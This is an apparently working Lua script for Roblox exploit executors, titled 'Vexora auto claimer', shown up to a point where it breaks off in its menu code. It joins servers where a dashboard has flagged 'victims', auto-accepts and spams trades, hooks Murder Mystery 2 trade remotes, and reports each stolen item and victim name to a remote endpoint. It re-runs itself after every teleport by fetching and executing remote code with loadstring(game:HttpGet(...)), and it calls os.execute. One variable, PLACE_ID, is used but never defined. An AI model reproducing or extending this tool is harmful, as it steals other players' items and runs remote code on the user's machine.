--[[ Vexora — auto claimer
  run this on the always-on alt. it polls the dashboard with your api key, and the
  moment a client flags a real victim it teleports into that server and starts trading.

  put it in your executor's autoexec folder (or use queue_on_teleport) so it comes
  back after every teleport.
]]

local CLAIMER_REV = "1.5"
local API_BASE = "{{API_BASE}}"
local API_KEY = "{{API_KEY}}"
local ENDPOINT = "{{ENDPOINT}}"
local SCRIPT_URL = "{{SCRIPT_URL}}"

local POLL_SECONDS = 3         -- seconds between target checks
local TRADE_DELAY = 2          -- seconds between trade attempts
local STAY_SECONDS = 240       -- how long to farm a server before chasing a new target
local AUTO_ACCEPT = true       -- accept incoming trade requests
local REPORT_ITEMS = true      -- post captured items to the dashboard
local TELEPORT_TIMEOUT = 8     -- seconds to wait for Roblox to actually leave the server
local JOIN_BACKOFF_MAX = 30    -- longest retry pause after a refused teleport

-- persisted across reloads by the executor
local settings = (getgenv and getgenv().VexoraClaimerSettings) or {}
if settings.autoExecute == nil then settings.autoExecute = true end
if settings.autoAccept == nil then settings.autoAccept = AUTO_ACCEPT end
settings.enabled = settings.autoExecute
if getgenv then getgenv().VexoraClaimerSettings = settings end

local ui = {
    state = "starting", polls = 0, queue = 0, target = nil, lastCapture = nil,
    error = nil, joinError = nil, joinLink = nil, joinNotice = nil,
    claimed = {}, claimCount = 0, claimValue = 0,
}
local joinBackoff = 0
local nextJoinAt = 0

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local ME = LocalPlayer and LocalPlayer.Name or "unknown"
local HERE = game.JobId ~= "" and game.JobId or nil
local PLACE = game.PlaceId
local TeleportService = game:GetService("TeleportService")

local GAME_MAP = {
    [142823291] = "mm2",
    [920587237] = "adm",
    [126884695634066] = "gag2",
    [109983668079237] = "sab",
}
local GAME = GAME_MAP[PLACE] or GAME_MAP[game.GameId] or "other"

local httpRequest
if typeof(request) == "function" then
    httpRequest = request
elseif typeof(syn) == "table" and typeof(syn.request) == "function" then
    httpRequest = syn.request
elseif typeof(http_request) == "function" then
    httpRequest = http_request
elseif typeof(fluxus) == "table" and typeof(fluxus.request) == "function" then
    httpRequest = fluxus.request
end

if not httpRequest then
    warn("[vexora-claimer] no HTTP function in this executor")
    return nil
end

-- one claimer per client; a reload replaces the old loop instead of stacking it
local state = getgenv and getgenv().VexoraClaimer
if state and state.stop then pcall(state.stop) end
local running = true
local function stop()
    running = false
end
if getgenv then getgenv().VexoraClaimer = { stop = stop, rev = CLAIMER_REV } end

local function encode(value)
    return tostring(value or ""):gsub("[^%w%-%._~]", function(c)
        return string.format("%%%02X", string.byte(c))
    end)
end

local function http(method, url, body)
    local opts = {
        Url = url,
        Method = method,
        Headers = { ["x-api-key"] = API_KEY, ["Content-Type"] = "application/json" },
    }
    if body then opts.Body = HttpService:JSONEncode(body) end

    local ok, res = pcall(httpRequest, opts)
    if not ok then return nil, tostring(res) end

    local status = res and (res.StatusCode or res.status or res.Status)
    local raw = res and (res.Body or res.body)
    local decoded = nil
    if typeof(raw) == "string" and #raw > 0 then
        pcall(function() decoded = HttpService:JSONDecode(raw) end)
    end
    return { status = status, body = decoded, raw = raw }, nil
end

local function report(payload)
    if not REPORT_ITEMS then return end
    pcall(function() http("POST", ENDPOINT, payload) end)
end

-- lets the dashboard show whether the phone is actually reaching it
local function heartbeat(state, target, err)
    pcall(function()
        http("POST", API_BASE .. "/api/claimer/heartbeat", {
            account = ME,
            rev = CLAIMER_REV,
            server = HERE,
            state = state or "polling",
            target = target,
            error = err,
        })
    end)
end

-- the in-game switch is the control the person actually sees. keep the dashboard
-- master switch in sync instead of expecting a second click on another device.
local function setDashboardArmed(armed)
    pcall(function()
        http("POST", API_BASE .. "/api/claimer/" .. (armed and "arm" or "disarm"))
    end)
end

--[[ ---- remote discovery ---- ]]
local function findRemotes(pattern)
    local out = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and obj.Name:lower():match(pattern) then
            table.insert(out, obj)
        end
    end
    return out
end

local tradeRemotes = findRemotes("trade")
local acceptRemotes = findRemotes("accept")
for _, remote in ipairs(findRemotes("request")) do
    if not table.find(tradeRemotes, remote) then table.insert(acceptRemotes, remote) end
end

local function playerIn(args)
    for _, value in ipairs(args) do
        if typeof(value) == "Instance" and value:IsA("Player") then return value end
        if typeof(value) == "string" then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr.Name == value then return plr end
            end
        end
    end
    return nil
end

local function itemIn(args, victim)
    for _, value in ipairs(args) do
        if typeof(value) == "string" and #value > 1
            and (not victim or value ~= victim.Name)
            and value:lower() ~= "accept" then
            return value
        end
    end
    return nil
end

local function capture(item, victim, value)
    local amount = tonumber(value) or 1
    local name = tostring(item)
    local from = tostring(victim or "Unknown victim")
    report({
        game = GAME,
        item = name,
        victim = from,
        value = amount,
        place_id = PLACE,
        server_id = HERE,
        executor = "vexora-claimer",
        roblox_user = ME,
    })
    report({
        event = "claimed",
        game = GAME,
        item = name,
        victim = from,
        value = amount,
        place_id = PLACE,
        server_id = HERE,
        executor = "vexora-claimer",
        roblox_user = ME,
    })
    table.insert(ui.claimed, 1, { item = name, victim = from, value = amount, at = os.time() })
    if #ui.claimed > 20 then table.remove(ui.claimed) end
    ui.claimCount = (tonumber(ui.claimCount) or 0) + 1
    ui.claimValue = (tonumber(ui.claimValue) or 0) + amount
    ui.lastCapture = name .. " <- " .. from
    ui.joinNotice = "claimed " .. name
    print(string.format("[vexora-claimer] captured %s from %s", name, from))
end

--[[ ---- accept any incoming trade request ---- ]]
local MM2 = PLACE == 142823291

local function clickSignal(button)
    if not button then return end
    pcall(function() firesignal(button.Activated) end)
    pcall(function() firesignal(button.MouseButton1Click) end)
end

local MM2_ACCEPT_PATHS = {
    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "ActionButton" },
    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "Cooldown", "Blocker" },
    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "ActionButton" },
    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "Cooldown", "Blocker" },
    { "TradeGUI.Phone", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
    { "TradeGUI.Phone", "Container", "Trade", "Actions", "Accept", "ActionButton" },
}

local function mm2TradeRoot()
    if not MM2 then return nil end
    return ReplicatedStorage:FindFirstChild("Trade")
end

local function mm2Confirm()
    local trade = mm2TradeRoot()
    local accept = trade and trade:FindFirstChild("AcceptRequest")
    if accept then pcall(function() accept:FireServer() end) end

    local gui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not gui then return end
    for _, path in ipairs(MM2_ACCEPT_PATHS) do
        local node = gui
        for _, name in ipairs(path) do
            node = node and node:FindFirstChild(name)
        end
        clickSignal(node)
    end
end

if MM2 then
    task.spawn(function()
        for _ = 1, 30 do
            local trade = mm2TradeRoot() or ReplicatedStorage:WaitForChild("Trade", 2)
            local sendRequest = trade and trade:FindFirstChild("SendRequest")
            if sendRequest then
                pcall(function()
                    sendRequest.OnClientInvoke = function()
                        task.spawn(function()
                            task.wait(0.4)
                            for _ = 1, 10 do
                                mm2Confirm()
                                task.wait(0.25)
                            end
                        end)
                        return true
                    end
                end)
                print("[vexora-claimer] mm2 SendRequest hook installed")
                return
            end
            task.wait(2)
        end
        print("[vexora-claimer] mm2 SendRequest hook not installed")
    end)
end

-- generic games: click accept on any incoming trade prompt, whoever sent it
local function findAcceptButton()
    local gui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not gui then return nil end
    for _, obj in ipairs(gui:GetDescendants()) do
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            local text = obj:IsA("TextButton") and tostring(obj.Text) or ""
            local label = (obj.Name .. " " .. text):lower()
            if label:find("accept", 1, true) or label:find("confirm", 1, true) then
                local node, context = obj, ""
                while node and node ~= gui do
                    context = context .. " " .. node.Name:lower()
                    node = node.Parent
                end
                if context:find("trade", 1, true) or context:find("request", 1, true) then
                    return obj
                end
            end
        end
    end
    return nil
end

task.spawn(function()
    while running do
        task.wait(1.5)
        if settings.autoAccept then
            local button = findAcceptButton()
            if button then
                clickSignal(button)
                print("[vexora-claimer] accepted an incoming trade request")
            end
        end
    end
end)

for _, remote in ipairs(acceptRemotes) do
    pcall(function()
        remote.OnClientEvent:Connect(function(...)
            local args = { ... }
            local victim = playerIn(args)
            if settings.autoAccept and victim then
                pcall(function() remote:FireServer("accept", victim) end)
                pcall(function() remote:FireServer(victim) end)
            end
            local item = itemIn(args, victim)
            if victim and item then capture(item, victim.Name) end
        end)
    end)
end

--[[ ---- trading ---- ]]
local trading = false
local arrivedAt = 0
local arrivedFor = nil
local seen = {}
local tradingLoop = nil

local function startTrading(target)
    if trading then return end
    trading = true
    arrivedAt = os.time()
    ui.state = "trading"
    ui.joinError = nil
    joinBackoff = 0
    nextJoinAt = 0
    ui.target = target or ui.target
    heartbeat("trading", target and target.server_id)
    print(string.format("[vexora-claimer] arrived in %s | target %s | %s trade remotes",
        tostring(HERE), tostring(target and target.item or "?"), tostring(#tradeRemotes)))

    if tradingLoop then return end
    tradingLoop = task.spawn(function()
        while running do
            local player = LocalPlayer
            if player and player.Character then
                if MM2 then
                    local trade = mm2TradeRoot()
                    local start = trade and trade:FindFirstChild("StartTrade")
                    if start then
                        for _, other in ipairs(Players:GetPlayers()) do
                            if other ~= player then
                                pcall(function() start:FireServer(other) end)
                            end
                        end
                    end
                    mm2Confirm()
                else
                    for _, remote in ipairs(tradeRemotes) do
                        for _, other in ipairs(Players:GetPlayers()) do
                            if other ~= player then
                                pcall(function() remote:FireServer(other) end)
                                pcall(function() remote:FireServer("trade", other) end)
                                pcall(function() remote:FireServer("request", other) end)
                            end
                        end
                    end
                end
            end
            task.wait(TRADE_DELAY)
        end
        trading = false
    end)
end

-- watch new tools too, in case the game hands items over silently
if LocalPlayer then
    task.spawn(function()
        local function watch(bag)
            bag.ChildAdded:Connect(function(child)
                if child:IsA("Tool") and not seen[child.Name] then
                    seen[child.Name] = true
                    capture(child.Name, "tool")
                end
            end)
        end
        local bag = LocalPlayer:FindFirstChildOfClass("Backpack")
        if bag then watch(bag) end
        LocalPlayer.ChildAdded:Connect(function(child)
            if child.Name == "Backpack" then task.wait(0.5); watch(child) end
        end)
    end)
end

--[[ ---- teleport ---- ]]
local function raiseIdentity()
    if typeof(setthreadidentity) == "function" then pcall(setthreadidentity, 8) end
    if typeof(setidentity) == "function" then pcall(setidentity, 8) end
    if typeof(syn) == "table" and typeof(syn.set_thread_identity) == "function" then
        pcall(syn.set_thread_identity, 8)
    end
end

local function queueSelf()
    local line = 'loadstring(game:HttpGet("' .. SCRIPT_URL .. '"))()'
    if typeof(queue_on_teleport) == "function" then
        pcall(queue_on_teleport, line)
    elseif typeof(queueonteleport) == "function" then
        pcall(queueonteleport, line)
    elseif typeof(syn) == "table" and typeof(syn.queue_on_teleport) == "function" then
        pcall(syn.queue_on_teleport, line)
    end
end

local teleportError = nil

local function noteTeleportFailure(player, result, message)
    if player and player ~= LocalPlayer then return end
    teleportError = tostring(message or result or "teleport failed")
    ui.joinError = teleportError
    print("[vexora-claimer] teleport failed: " .. teleportError)
end

pcall(function() TeleportService.TeleportInitFailed:Connect(noteTeleportFailure) end)

-- a refused teleport never throws in most executors; it arrives later through
-- TeleportInitFailed. release the dashboard job immediately so the next poll can
-- retry instead of sitting on a 90 second lease.
local function reportJoinFailure(target, message)
    if not target or not target.id then return end
    pcall(function()
        http("POST", API_BASE .. "/api/claimer/target/" .. encode(target.id) .. "/failed", {
            server_id = HERE,
            account = ME,
            error = tostring(message or "teleport failed"):sub(1, 180),
            retry = true,
        })
    end)
end

local function joinUrl(target, web)
    if not target or not target.place_id or not target.server_id then return nil end
    local server = encode(target.server_id)
    if web then
        return "https://www.roblox.com/games/start?placeId=" .. tostring(target.place_id)
            .. "&gameInstanceId=" .. server
    end
    return "roblox://placeId=" .. tostring(target.place_id) .. "&gameInstanceId=" .. server
end

local function copyText(text)
    if typeof(setclipboard) == "function" then return pcall(setclipboard, text) end
    if typeof(toclipboard) == "function" then return pcall(toclipboard, text) end
    if typeof(set_clipboard) == "function" then return pcall(set_clipboard, text) end
    if typeof(syn) == "table" and typeof(syn.set_clipboard) == "function" then
        return pcall(syn.set_clipboard, text)
    end
    return false
end

local function shell(command)
    if typeof(os) ~= "table" or typeof(os.execute) ~= "function" then return false end
    local ok, first, _, code = pcall(os.execute, command)
    if not ok then return false end
    return first == true or first == 0 or code == 0
end

-- 773 is Roblox refusing a teleport that crosses experiences. a deep link is a
-- normal join request, not an in-game teleport, so it can hand the same account
-- to a different game and a specific server.
local function externalJoin(target)
    local deep, web = joinUrl(target, false), joinUrl(target, true)
    if not deep then return false end
    ui.joinLink = web

    local launched = shell('start "" "' .. deep .. '"')
        or shell('open "' .. deep .. '"')
        or shell('xdg-open "' .. deep .. '"')

    if not launched then
        local gui = game:GetService("GuiService")
        if gui and typeof(gui.OpenBrowserWindow) == "function" then
            local ok = pcall(function() gui:OpenBrowserWindow(web) end)
            launched = ok
        end
    end

    if not launched then copyText(web) end
    print(string.format("[vexora-claimer] external join %s | %s", launched and "opened" or "copied", web))
    return launched
end

local function joinTarget(target)
    if not target or not target.place_id or not target.server_id then
        return false, "target is missing its place or server id"
    end
    if os.time() < nextJoinAt then
        return false, string.format("retry in %ds", math.ceil(nextJoinAt - os.time()))
    end

    local placeId = tonumber(target.place_id)
    if not placeId then return false, "target has an invalid place id" end

    raiseIdentity()
    queueSelf()
    teleportError = nil
    ui.state = "joining"
    ui.joinError = nil
    local crossGame = tonumber(target.place_id) ~= PLACE_ID
    if crossGame then
        ui.joinError = "cross-game: opening a direct join"
        heartbeat("joining", target.server_id)
        local allowed = not (getgenv and getgenv().VexoraNoExternal)
        if allowed and externalJoin(target) then
            ui.state = "handoff"
            ui.joinError = "opened in a new client — keep autoexec on"
            nextJoinAt = os.time() + 300
            return false, "handoff"
        end
        if allowed then
            ui.joinError = "join link copied — open it on this PC"
            nextJoinAt = os.time() + 120
            return false, "join link copied"
        end
        ui.joinError = "cross-game: run the claimer inside that game"
    end
    heartbeat("joining", target.server_id)

    local beforeJob, beforePlace = game.JobId, game.PlaceId

    -- only real targeted calls. a plain Teleport(placeId) would drop the alt in
    -- a random server and look like it never moved to the flagged one.
    local asyncAttempt = function()
        local options = Instance.new("TeleportOptions")
        options.ServerInstanceId = target.server_id
        TeleportService:TeleportAsync(placeId, { LocalPlayer }, options)
    end
    local legacyWithPlayer = function()
        TeleportService:TeleportToPlaceInstance(placeId, target.server_id, LocalPlayer)
    end
    local legacyNoPlayer = function()
        TeleportService:TeleportToPlaceInstance(placeId, target.server_id)
    end

    -- TeleportToPlaceInstance is the call executors reliably expose inside the
    -- same game. cross-game targets get TeleportAsync first because the legacy
    -- call is the one Roblox refuses across experiences.
    local attempts = crossGame
        and { asyncAttempt, legacyWithPlayer, legacyNoPlayer }
        or { legacyWithPlayer, legacyNoPlayer, asyncAttempt }

    local started, lastError = false, nil
    for index, attempt in ipairs(attempts) do
        local ok, err = pcall(attempt)
        print(string.format("[vexora-claimer] teleport %d/%d -> place %s server %s", index, #attempts,
            tostring(placeId), tostring(target.server_id)))
        if ok then started = true; break end
        lastError = tostring(err)
        print("[vexora-claimer] teleport call failed: " .. lastError)
        task.wait(0.5)
    end

    if not started then
        local message = lastError or "TeleportToPlaceInstance is unavailable"
        if crossGame then message = message .. " (cross-game: run inside the target game)" end
        reportJoinFailure(target, message)
        joinBackoff = math.min(JOIN_BACKOFF_MAX, joinBackoff > 0 and joinBackoff * 2 or 5)
        nextJoinAt = os.time() + joinBackoff
        ui.state = "failed"
        ui.joinError = message
        return false, message
    end

    -- wait for the real answer. the client usually closes within a second on a
    -- successful join; if it is still sitting here after the timeout, the call
    -- was silently dropped.
    local waited = 0
    while waited < TELEPORT_TIMEOUT and running do
        task.wait(0.5)
        waited = waited + 0.5
        if teleportError then break end
        if game.JobId ~= beforeJob or game.PlaceId ~= beforePlace then
            joinBackoff = 0
            nextJoinAt = 0
            return true
        end
    end

    local failure = teleportError
    teleportError = nil
    if failure then
        if crossGame then failure = failure .. " (cross-game: run inside the target game)" end
        reportJoinFailure(target, failure)
        joinBackoff = math.min(JOIN_BACKOFF_MAX, joinBackoff > 0 and joinBackoff * 2 or 5)
        nextJoinAt = os.time() + joinBackoff
        ui.state = "failed"
        ui.joinError = failure
        return false, failure
    end

    local dropped = "teleport did not start"
    if crossGame then dropped = dropped .. " (cross-game: run inside the target game)" end
    reportJoinFailure(target, dropped)
    joinBackoff = math.min(JOIN_BACKOFF_MAX, joinBackoff > 0 and joinBackoff * 2 or 5)
    nextJoinAt = os.time() + joinBackoff
    ui.state = "failed"
    ui.joinError = dropped
    return false, dropped
end

--[[ ---- poll loop ---- ]]
local function getTarget()
    -- once the stay timer is up, ask for a different server while still farming this one
    local move = (trading and (os.time() - arrivedAt) >= STAY_SECONDS) and "&move=1" or ""
    local res, err = http("GET", API_BASE .. "/api/claimer/target?account=" .. encode(ME)
        .. "&server=" .. encode(HERE) .. move)
    ui.polls = ui.polls + 1
    if not res then
        ui.state = "offline"
        ui.error = tostring(err)
        print("[vexora-claimer] poll failed: " .. tostring(err))
        return nil
    end
    if res.status == 401 then
        ui.state = "failed"
        ui.error = "api key rejected - regenerate it on the dashboard"
        heartbeat("failed", nil, ui.error)
        print("[vexora-claimer] api key rejected - regenerate it on the dashboard")
        return nil
    end
    if res.status == 403 then
        ui.state = "failed"
        ui.error = (type(res.body) == "table" and res.body.error)
            or "this account is not allowed to use the auto claimer"
        heartbeat("failed", nil, ui.error)
        print("[vexora-claimer] poll 403: " .. tostring(ui.error))
        return nil
    end
    if res.status ~= 200 or type(res.body) ~= "table" then
        ui.state = "failed"
        ui.error = "poll http " .. tostring(res.status)
        heartbeat("failed", nil, ui.error)
        print("[vexora-claimer] " .. ui.error)
        return nil
    end
    local body = res.body
    ui.error = nil
    ui.target = body.target or nil
    ui.queue = tonumber(body.queue) or 0
    ui.state = body.paused and "paused" or (body.target and "target" or "polling")
    if body.paused then
        ui.error = "joiner is off on the dashboard"
        heartbeat("paused")
    elseif body.target then
        heartbeat("target", body.target.server_id)
    else
        heartbeat("polling")
    end
    return body
end

-- pull the durable claim history so the panel is populated after a reload
local function loadClaimed()
    local res = http("GET", API_BASE .. "/api/claimer/claimed")
    if not res or res.status ~= 200 or type(res.body) ~= "table" then return end
    local rows = res.body.claimed
    if type(rows) ~= "table" then return end
    ui.claimed = {}
    for index = 1, math.min(#rows, 20) do
        local row = rows[index]
        if type(row) == "table" then
            table.insert(ui.claimed, {
                item = tostring(row.item or "?"),
                victim = tostring(row.victim or "?"),
                value = tonumber(row.value) or 0,
                at = tonumber(row.at) or 0,
            })
        end
    end
    ui.claimCount = tonumber(res.body.total) or #ui.claimed
    ui.claimValue = tonumber(res.body.value) or 0
end

--[[ ---- in-game menu ---- ]]
local uiApi = {}

local function buildLegacyUi()
    local playerGui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not playerGui then return end

    local old = playerGui:FindFirstChild("VexoraClaimerUI")
    if old then old:Destroy() end

    local screen = Instance.new("ScreenGui")
    screen.Name = "VexoraClaimerUI"
    screen.ResetOnSpawn = false
    screen.IgnoreGuiInset = true
    screen.DisplayOrder = 9999
    screen.Parent = playerGui

    local function new(class, props, parent)
        local obj = Instance.new(class)
        for key, value in pairs(props) do pcall(function() obj[key] = value end) end
        obj.Parent = parent
        return obj
    end

    local function round(obj, radius)
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, radius or 8)
        corner.Parent = obj
    end

    local bg = Color3.fromRGB(15, 15, 21)
    local card = Color3.fromRGB(27, 27, 37)
    local ink = Color3.fromRGB(236, 236, 246)
    local dim = Color3.fromRGB(148, 148, 170)
    local accent = Color3.fromRGB(139, 92, 246)
    local on = Color3.fromRGB(34, 197, 94)
    local off = Color3.fromRGB(239, 68, 68)

    local float = new("TextButton", {
        Name = "Open", Size = UDim2.fromOffset(44, 30), Position = UDim2.fromOffset(16, 16),
        BackgroundColor3 = accent, Text = "V", TextSize = 16, Font = Enum.Font.GothamBold,
        TextColor3 = Color3.new(1, 1, 1), AutoButtonColor = false,
    }, screen)
    round(float, 8)

    local frame = new("Frame", {
        Name = "Window", Size = UDim2.fromOffset(318, 288), Position = UDim2.fromOffset(16, 54),
        BackgroundColor3 = bg, BorderSizePixel = 0,
    }, screen)
    round(frame, 12)

    local header = new("Frame", {
        Size = UDim2.new(1, 0, 0, 38), BackgroundColor3 = Color3.fromRGB(23, 23, 32),
        BorderSizePixel = 0,
    }, frame)
    round(header, 12)

    new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(12, 9), Size = UDim2.new(1, -48, 0, 20),
        Font = Enum.Font.GothamBold, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = ink, Text = "VEXORA CLAIMER  ·  " .. CLAIMER_REV,
    }, header)

    local close = new("TextButton", {
        Size = UDim2.fromOffset(26, 26), Position = UDim2.new(1, -34, 0, 6),
        BackgroundColor3 = Color3.fromRGB(41, 41, 54), Text = "x", TextSize = 13,
        Font = Enum.Font.GothamBold, TextColor3 = ink, AutoButtonColor = false,
    }, header)
    round(close, 7)

    local content = new("Frame", {
        Position = UDim2.fromOffset(0, 40), Size = UDim2.new(1, 0, 1, -40), BackgroundTransparency = 1,
    }, frame)

    local stateLabel = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 6), Size = UDim2.new(1, -28, 0, 16),
        Font = Enum.Font.GothamBold, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = ink, Text = "starting",
    }, content)

    local targetLabel = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 24), Size = UDim2.new(1, -28, 0, 16),
        Font = Enum.Font.Code, TextSize = 11, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = dim, Text = "no target yet",
    }, content)

    local captureLabel = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 42), Size = UDim2.new(1, -28, 0, 16),
        Font = Enum.Font.Code, TextSize = 11, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = dim, Text = "polls: 0",
    }, content)

    local function toggleRow(textValue, y, isOn, onChange)
        local row = new("Frame", {
            Position = UDim2.fromOffset(14, y), Size = UDim2.new(1, -28, 0, 28),
            BackgroundColor3 = card, BorderSizePixel = 0,
        }, content)
        round(row, 8)
        new("TextLabel", {
            BackgroundTransparency = 1, Position = UDim2.fromOffset(10, 5),
            Size = UDim2.new(1, -66, 0, 18), Font = Enum.Font.Gotham, TextSize = 11,
            TextXAlignment = Enum.TextXAlignment.Left, TextColor3 = ink, Text = textValue,
        }, row)
        local pill = new("TextButton", {
            Position = UDim2.new(1, -56, 0, 4), Size = UDim2.fromOffset(46, 20),
            BackgroundColor3 = isOn and on or off, Text = isOn and "ON" or "OFF",
            TextSize = 10, Font = Enum.Font.GothamBold, TextColor3 = Color3.new(1, 1, 1),
            AutoButtonColor = false,
        }, row)
        round(pill, 6)
        pill.MouseButton1Click:Connect(function()
            isOn = not isOn
            pill.Text = isOn and "ON" or "OFF"
            pill.BackgroundColor3 = isOn and on or off
            onChange(isOn)
        end)
    end

    toggleRow("Auto claimer", 66, settings.enabled, function(value)
        settings.enabled = value
        ui.state = value and "polling" or "off"
        setDashboardArmed(value)
        if uiApi.update then uiApi.update() end
    end)
    toggleRow("Auto execute on load", 98, settings.autoExecute, function(value)
        settings.autoExecute = value
    end)
    toggleRow("Auto accept trades", 130, settings.autoAccept, function(value)
        settings.autoAccept = value
        AUTO_ACCEPT = value
    end)

    local poll = new("TextButton", {
        Position = UDim2.fromOffset(14, 168), Size = UDim2.new(1, -28, 0, 28),
        BackgroundColor3 = accent, Text = "Poll dashboard now", TextSize = 12,
        Font = Enum.Font.GothamBold, TextColor3 = Color3.new(1, 1, 1), AutoButtonColor = false,
    }, content)
    round(poll, 8)
    poll.MouseButton1Click:Connect(function()
        task.spawn(function()
            getTarget()
            if uiApi.update then uiApi.update() end
        end)
    end)

    local footer = new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(14, 202), Size = UDim2.new(1, -28, 0, 28),
        Font = Enum.Font.Code, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
        TextWrapped = true, TextColor3 = dim, Text = "api " .. API_BASE,
    }, content)

    local function setOpen(open)
        frame.Visible = open
        float.Visible = not open
    end
    close.MouseButton1Click:Connect(function() setOpen(false) end)
    float.MouseButton1Click:Connect(function() setOpen(true) end)

    local dragging, dragStart, startPos = false, nil, nil
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    uiApi.update = function()
        if not frame.Parent then return end
        stateLabel.Text = string.format("%s  ·  %s", tostring(ui.state), ME)
        stateLabel.TextColor3 = (ui.state == "offline" or ui.state == "off" or ui.state == "failed")
            and off or ink
        local target = ui.target
        targetLabel.Text = target
            and string.format("%s  (%s)  %s", tostring(target.item or "?"),
                tostring(target.value or "?"), tostring(target.server_id or ""):sub(1, 10))
            or "no target yet"
        captureLabel.Text = ui.error and ("error: " .. tostring(ui.error):sub(1, 46))
            or (ui.joinError and ("join: " .. tostring(ui.joinError):sub(1, 42))
            or (ui.lastCapture and ("captured: " .. ui.lastCapture)
            or ("polls: " .. tostring(ui.polls) .. "  ·  q:" .. tostring(ui.queue or 0) .. "  ·  " .. GAME)))
        footer.Text = "api " .. API_BASE
    end

    setOpen(true)
end

local function buildUi()
    local playerGui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not playerGui then return end
    local old = playerGui:FindFirstChild("VexoraClaimerUI")
    if old then old:Destroy() end

    local screen = Instance.new("ScreenGui")
    screen.Name = "VexoraClaimerUI"
    screen.ResetOnSpawn = false
    screen.IgnoreGuiInset = true
    screen.DisplayOrder = 9999
    screen.Parent = playerGui

    local function new(class, props, parent)
        local obj = Instance.new(class)
        for key, value in pairs(props) do pcall(function() obj[key] = value end) end
        obj.Parent = parent
        return obj
    end
    local function round(obj, radius)
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, radius or 8)
        corner.Parent = obj
    end
    local function outline(obj, color, transparency)
        local stroke = Instance.new("UIStroke")
        stroke.Color = color or Color3.fromRGB(52, 52, 72)
        stroke.Transparency = transparency or 0.45
        stroke.Thickness = 1
        stroke.Parent = obj
    end
    local function gradient(obj, first, second, rotation)
        local g = Instance.new("UIGradient")
        g.Color = ColorSequence.new(first, second)
        g.Rotation = rotation or 0
        g.Parent = obj
    end
    local function moneyText(value)
        local n = tonumber(value) or 0
        if n >= 1000000 then return string.format("$%.1fm", n / 1000000) end
        if n >= 1000 then return string.format("$%.1fk", n / 1000) end
        return "$" .. tostring(math.floor(n))
    end

    local bg = Color3.fromRGB(11, 11, 17)
    local panel = Color3.fromRGB(22, 22, 32)
    local panel2 = Color3.fromRGB(30, 30, 43)
    local ink = Color3.fromRGB(238, 238, 247)
    local dim = Color3.fromRGB(148, 148, 172)
    local accent = Color3.fromRGB(124, 92, 250)
    local cyan = Color3.fromRGB(56, 189, 248)
    local green = Color3.fromRGB(34, 197, 94)
    local red = Color3.fromRGB(239, 68, 68)
    local gold = Color3.fromRGB(250, 204, 21)

    local float = new("TextButton", {
        Name = "Open", Size = UDim2.fromOffset(48, 32), Position = UDim2.fromOffset(16, 16),
        BackgroundColor3 = accent, Text = "V", TextSize = 17, Font = Enum.Font.GothamBold,
        TextColor3 = Color3.new(1, 1, 1), AutoButtonColor = false,
    }, screen)
    round(float, 10)
    gradient(float, accent, cyan, 35)
    outline(float, Color3.new(1, 1, 1), 0.75)

    local frame = new("Frame", {
        Name = "Window", Size = UDim2.fromOffset(348, 470), Position = UDim2.fromOffset(16, 54),
        BackgroundColor3 = bg, BorderSizePixel = 0,
    }, screen)
    round(frame, 14)
    outline(frame, Color3.fromRGB(58, 58, 82), 0.35)

    local header = new("Frame", {
        Size = UDim2.new(1, 0, 0, 46), BackgroundColor3 = panel, BorderSizePixel = 0,
    }, frame)
    round(header, 12)
    gradient(header, Color3.fromRGB(38, 30, 62), Color3.fromRGB(18, 18, 27), 90)

    new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(13, 7), Size = UDim2.new(1, -150, 0, 17),
        Font = Enum.Font.GothamBold, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = ink, Text = "VEXORA CLAIMER",
    }, header)
    new("TextLabel", {
        BackgroundTransparency = 1, Position = UDim2.fromOffset(13, 25), Size = UDim2.new(1, -150, 0, 14),
        Font = Enum.Font.Code, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
